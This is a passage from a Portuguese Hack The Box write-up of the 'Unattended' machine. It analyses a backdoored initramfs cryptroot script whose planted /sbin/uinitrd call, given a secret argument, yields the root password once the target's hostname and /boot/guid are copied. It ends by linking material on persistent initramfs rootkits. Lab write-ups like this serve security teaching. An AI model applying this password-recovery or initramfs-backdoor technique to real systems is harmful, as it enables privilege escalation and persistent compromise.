	if /sbin/cryptsetup isLuks ${cryptheader:-$cryptsource} >/dev/null 2>&1; then
		cryptopen="$cryptopen open --type luks $cryptsource $crypttarget --key-file=-"
	elif [ "$crypttcrypt" = "yes" ]; then
		cryptopen="$cryptopen open --type tcrypt $cryptsource $crypttarget"
	else
		cryptopen="$cryptopen -c $cryptcipher -s $cryptsize -h $crypthash open --type plain $cryptsource $crypttarget --key-file=-"
	fi
	cryptremove="/sbin/cryptsetup remove $crypttarget"
	NEWROOT="/dev/mapper/$crypttarget"

	# Try to get a satisfactory password $crypttries times
	count=0
	while [ $crypttries -le 0 ] || [ $count -lt $crypttries ]; do
		export CRYPTTAB_TRIED="$count"
		count=$(( $count + 1 ))

		if [ -z "$cryptkeyscript" ]; then
			if [ ${cryptsource#/dev/disk/by-uuid/} != $cryptsource ]; then
				# UUIDs are not very helpful
				diskname="$crypttarget"
			else
				diskname="$cryptsource ($crypttarget)"
			fi

			if [ -x /bin/plymouth ] && plymouth --ping; then
				cryptkeyscript="plymouth ask-for-password --prompt"
				# Plymouth will add a : if it is a non-graphical prompt
				cryptkey="Please unlock disk $diskname"
			else
				cryptkeyscript="/lib/cryptsetup/askpass"
				cryptkey="Please unlock disk $diskname: "
			fi
		fi


		if [ ! -e "$NEWROOT" ]; then
      # guly: we have to deal with lukfs password sync when root changes her one
      if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
				message "cryptsetup: cryptsetup failed, bad password or options?"
				sleep 3
				continue
			fi
		fi

		if [ ! -e "$NEWROOT" ]; then
			message "cryptsetup: unknown error setting up device mapping"
			return 1
		fi

		#FSTYPE=''
		#eval $(fstype < "$NEWROOT")
		FSTYPE="$(/sbin/blkid -s TYPE -o value "$NEWROOT")"

		# See if we need to setup lvm on the crypto device
		#if [ "$FSTYPE" = "lvm" ] || [ "$FSTYPE" = "lvm2" ]; then
		if [ "$FSTYPE" = "LVM_member" ] || [ "$FSTYPE" = "LVM2_member" ]; then
			if [ -z "$cryptlvm" ]; then
				message "cryptsetup: lvm fs found but no lvm configured"
				return 1
			elif ! activate_vg; then
				# disable error message, LP: #151532
				#message "cryptsetup: failed to setup lvm device"
				return 1
			fi

			# Apparently ROOT is already set in /conf/param.conf for
			# flashed kernels at least. See bugreport #759720.
			if [ -f /conf/param.conf ] && grep -q "^ROOT=" /conf/param.conf; then
				NEWROOT=$(sed -n 's/^ROOT=//p' /conf/param.conf)
			else
				NEWROOT=${cmdline_root:-/dev/mapper/$cryptlvm}
				if [ "$cryptrootdev" = "yes" ]; then
					# required for lilo to find the root device
					echo "ROOT=$NEWROOT" >>/conf/param.conf
				fi
			fi
			#eval $(fstype < "$NEWROOT")
			FSTYPE="$(/sbin/blkid -s TYPE -o value "$NEWROOT")"
		fi

		#if [ -z "$FSTYPE" ] || [ "$FSTYPE" = "unknown" ]; then
		if [ -z "$FSTYPE" ]; then
			message "cryptsetup: unknown fstype, bad password or options?"
			udev_settle
			$cryptremove
			continue
		fi

		message "cryptsetup: $crypttarget set up successfully"
		break
	done

	if [ $crypttries -gt 0 ] && [ $count -gt $crypttries ]; then
		message "cryptsetup: maximum number of tries exceeded for $crypttarget"
		return 1
	fi

	udev_settle
	return 0
}

#
# Begin real processing
#

# Do we have any kernel boot arguments?
cmdline_cryptopts=''
unset cmdline_root
for opt in $(cat /proc/cmdline); do
	case $opt in
	cryptopts=*)
		opt="${opt#cryptopts=}"
		if [ -n "$opt" ]; then
			if [ -n "$cmdline_cryptopts" ]; then
				cmdline_cryptopts="$cmdline_cryptopts $opt"
			else
				cmdline_cryptopts="$opt"
			fi
		fi
		;;
	root=*)
		opt="${opt#root=}"
		case $opt in
		/*) # Absolute path given. Not lilo major/minor number.
			cmdline_root=$opt
			;;
		*) # lilo major/minor number (See #398957). Ignore
		esac
		;;
	esac
done

if [ -n "$cmdline_cryptopts" ]; then
	# Call setup_mapping separately for each possible cryptopts= setting
	for cryptopt in $cmdline_cryptopts; do
		setup_mapping "$cryptopt"
	done
	exit 0
fi

# Do we have any settings from the /conf/conf.d/cryptroot file?
if [ -r /conf/conf.d/cryptroot ]; then
	while read mapping <&3; do
		setup_mapping "$mapping" 3<&-
	done 3< /conf/conf.d/cryptroot
fi

exit 0
```

Uma parte nos chamou bastante atenção, um comentário que traz uma informação para o usuário guly

```
[...]
if [ ! -e "$NEWROOT" ]; then
        # guly: we have to deal with lukfs password sync when root changes her one
        if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
                message "cryptsetup: cryptsetup failed, bad password or options?"
                sleep 3
                continue
        fi
fi
[...]
```

O que está dizendo ai? Se o usuário root trocar sua senha, ele precisa rodar esse comando, vamos ver o que realmente está acontecendo...

`crypttarget="$crypttarget" cryptsource="$cryptsource" /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen`

Estão sendo colocadas duas variáveis, e sendo chamado o /sbin/unitrd com um argumento bizarro, e passando esse resultado para a variável $cryptopen. Mas o que é essa cryptopen?

Voltando no código, encontramos...

```
# Prepare commands
cryptopen="/sbin/cryptsetup -T 1"
if [ "$cryptdiscard" = "yes" ]; then
        cryptopen="$cryptopen --allow-discards"
fi
if [ -n "$cryptheader" ]; then
        cryptopen="$cryptopen --header=$cryptheader"
fi
if /sbin/cryptsetup isLuks ${cryptheader:-$cryptsource} >/dev/null 2>&1; then
        cryptopen="$cryptopen open --type luks $cryptsource $crypttarget --key-file=-"
elif [ "$crypttcrypt" = "yes" ]; then
        cryptopen="$cryptopen open --type tcrypt $cryptsource $crypttarget"
else
        cryptopen="$cryptopen -c $cryptcipher -s $cryptsize -h $crypthash open --type plain $cryptsource $crypttarget --key-file=-"
fi
```

Uma vez que compreendemos (ou não), como é o funcionamento do script, vamso ver qual a saída do `/sbin/uinitrd c0m3s3f0ss34nt4n1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv5.png)

Estranho, pq essa não é a senha do root, então vamos verificar com o `strace` o que está acontecendo com esse binário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv6.png)

Verificando aqui, ele pega a os dados que estão em `/etc/hostname` e em `/boot/guid`, e utiliza como se fosse uma comparação para dar a string correta, então vamos copiar as configurações da máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv7.png)

Executamos novamente o comando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv8.png)

Agora sim é a senha de root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_priv9.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-unattended/U_user.png)

# Algo a mais

Depois de todo esse enrosco em que não entendi quase nada, e que grande parte do conteúdo peguei do `Ippsec` e do `0xdf`, temos um artigo muito bom, que recomendo a leitura, a respeito de como se fazer rootkit persistente abusando do que foi demonstrado acima...

https://yassine.tioual.com/posts/backdoor-initramfs-and-make-your-rootkit-persistent/

Também tem esse vídeo onde é explicado todo esse processo

https://www.youtube.com/watch?v=wyRRbow4-bc